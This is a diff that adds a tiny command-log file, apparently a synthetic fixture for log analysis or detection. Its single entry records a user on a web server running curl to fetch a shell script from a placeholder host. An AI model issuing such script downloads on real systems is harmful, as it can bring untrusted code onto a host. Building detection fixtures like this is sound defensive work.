@@ -1,0 +1,2 @@
+Time|Host|User|SourceIP|Command
+11:00:01|linux-web-01|user|198.51.100.77|curl http://example.test/file.sh
